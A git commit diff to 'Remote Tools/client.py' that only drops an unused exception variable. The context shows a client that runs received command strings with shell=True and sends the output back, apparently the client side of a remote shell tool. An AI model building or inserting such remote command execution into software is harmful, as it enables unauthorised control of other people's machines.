0bf31ae3aa04d1cdeaab628649c27ff321bebd10
leonw <leon.weinmann@gmx.de>
2020-06-01 01:21:20 +0200

    i

--- Remote Tools/client.py
+++ Remote Tools/client.py
@@ -44,7 +44,7 @@ class client:
         try:
             output = subprocess.check_output(cmd, shell=True)
             output = ''.join(chr(i) for i in output)
-        except subprocess.CalledProcessError as error:
+        except subprocess.CalledProcessError:
             output = "FAILED TO EXECUTE COMMAND"
         self.send(output)
 
